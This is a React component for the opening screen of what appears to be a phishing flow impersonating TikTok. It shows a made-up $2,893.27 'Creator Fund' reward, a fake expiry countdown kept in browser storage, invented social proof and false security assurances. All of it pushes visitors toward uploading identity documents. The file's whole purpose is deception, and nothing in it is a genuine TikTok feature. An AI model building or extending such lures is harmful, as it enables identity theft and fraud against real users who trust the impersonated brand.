import { useState, useEffect } from "react";
import { Gift, ShieldCheck, Clock, CheckCircle, Sparkles, Flame } from "lucide-react";
import { Button } from "@/components/ui/button";
import TikTokHeader from "./TikTokHeader";

interface WelcomeScreenProps {
  userName: string;
  onContinue: () => void;
}

const benefits = [
  { icon: ShieldCheck, text: "Secure identity verification" },
  { icon: Clock, text: "Quick — only 3 documents, about 1 minute" },
  { icon: CheckCircle, text: "Funds released within 1-3 business days" },
];

// Pseudo-random avatar colors for social proof
const avatarColors = [
  "bg-blue-500/80",
  "bg-emerald-500/80",
  "bg-amber-500/80",
  "bg-rose-500/80",
  "bg-cyan-500/80",
  "bg-orange-500/80",
];

const COUNTDOWN_KEY = "reward_countdown_ts";
const COUNTDOWN_DURATION = 47 * 3600 + 32 * 60 + 15;

function useCountdown() {
  const [seconds, setSeconds] = useState(() => {
    const stored = localStorage.getItem(COUNTDOWN_KEY);
    if (stored) {
      const remaining = Math.floor((Number(stored) - Date.now()) / 1000);
      return remaining > 0 ? remaining : 0;
    }
    const deadline = Date.now() + COUNTDOWN_DURATION * 1000;
    localStorage.setItem(COUNTDOWN_KEY, String(deadline));
    return COUNTDOWN_DURATION;
  });

  useEffect(() => {
    const interval = setInterval(() => {
      setSeconds((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const hours = Math.floor(seconds / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  const pad = (n: number) => String(n).padStart(2, "0");

  return { display: `${pad(hours)}:${pad(minutes)}:${pad(secs)}`, hours, minutes, secs };
}

const CountdownTimer = () => {
  const { display } = useCountdown();

  return (
    <div className="flex items-center justify-center gap-2 py-2.5 px-4 rounded-full bg-destructive/10 border border-destructive/20">
      <Flame className="w-4 h-4 text-destructive" />
      <span className="text-xs font-semibold text-destructive">
        Reward expires in <span className="tabular-nums">{display}</span>
      </span>
    </div>
  );
};

const SocialProof = () => (
  <div className="flex items-center justify-center gap-3">
    <div className="flex -space-x-2">
      {avatarColors.map((color, i) => (
        <div
          key={i}
          className={`w-7 h-7 rounded-full border-2 border-background ${color} flex items-center justify-center`}
        >
          <span className="text-[9px] font-bold text-white/90">
            {String.fromCharCode(65 + i)}
          </span>
        </div>
      ))}
    </div>
    <p className="text-xs text-muted-foreground">
      <strong className="text-foreground">50,000+</strong> creators verified this week
    </p>
  </div>
);

const WelcomeScreen = ({ userName, onContinue }: WelcomeScreenProps) => {
  return (
    <div className="min-h-screen flex flex-col bg-background">
      <TikTokHeader showHelp />

      <div className="flex-1 flex flex-col px-6 py-6">
        <p className="text-sm text-muted-foreground mb-1">
          Welcome back, <strong className="text-foreground">{userName}!</strong>
        </p>

        <div className="mt-4 mb-2 flex items-center justify-between">
          <h2 className="text-xl font-semibold">Your reward is ready</h2>
          <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
            Step 1 of 4
          </span>
        </div>

        {/* Urgency countdown */}
        <div className="mt-4 mb-2">
          <CountdownTimer />
        </div>

        {/* Hero prize card */}
        <div className="relative rounded-2xl bg-gradient-to-br from-foreground via-foreground/95 to-foreground/85 text-primary-foreground p-6 shadow-xl overflow-hidden mt-3 mb-4">
          <Sparkles className="absolute top-4 right-4 w-14 h-14 opacity-[0.08]" strokeWidth={1.5} />
          <div className="absolute inset-0 bg-gradient-to-tr from-transparent via-white/[0.03] to-white/[0.08] pointer-events-none" />
          <div className="flex items-center justify-center gap-2 mb-3 relative z-10">
            <Gift className="w-5 h-5 text-success" />
            <span className="text-xs uppercase tracking-widest opacity-60 font-semibold">Available Balance</span>
          </div>
          <p className="text-[44px] font-bold tracking-tighter leading-none text-center relative z-10">$2,893.27</p>
          <p className="text-[11px] opacity-50 mt-3 text-center relative z-10">
            Verified reward from TikTok Creator Fund
          </p>
        </div>

        {/* Social proof */}
        <div className="mb-5">
          <SocialProof />
        </div>

        <p className="text-sm text-muted-foreground text-center mb-6">
          To withdraw your funds, we need to verify your identity. This is a one-time process required by TikTok's payout policy.
        </p>

        {/* Benefits list */}
        <div className="space-y-3 mb-6">
          {benefits.map((b) => {
            const Icon = b.icon;
            return (
              <div key={b.text} className="flex items-center gap-3 p-3 rounded-xl bg-secondary/60 border border-border/40">
                <div className="flex items-center justify-center w-9 h-9 rounded-full bg-success/10 shrink-0">
                  <Icon className="w-4 h-4 text-success" />
                </div>
                <p className="text-sm font-medium">{b.text}</p>
              </div>
            );
          })}
        </div>

        <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mb-6">
          <ShieldCheck className="w-4 h-4 text-success shrink-0" />
          <p className="text-xs text-muted-foreground">
            Your data is <strong className="text-foreground">encrypted</strong> and securely stored. We never share your documents.
          </p>
        </div>

        <div className="mt-auto">
          <Button
            onClick={onContinue}
            className="w-full h-14 rounded-full text-base font-semibold"
          >
            Continue to Verification
          </Button>
          <p className="text-[10px] text-muted-foreground/60 text-center mt-3">
            By continuing you agree to TikTok's verification terms
          </p>
        </div>
      </div>
    </div>
  );
};

export default WelcomeScreen;
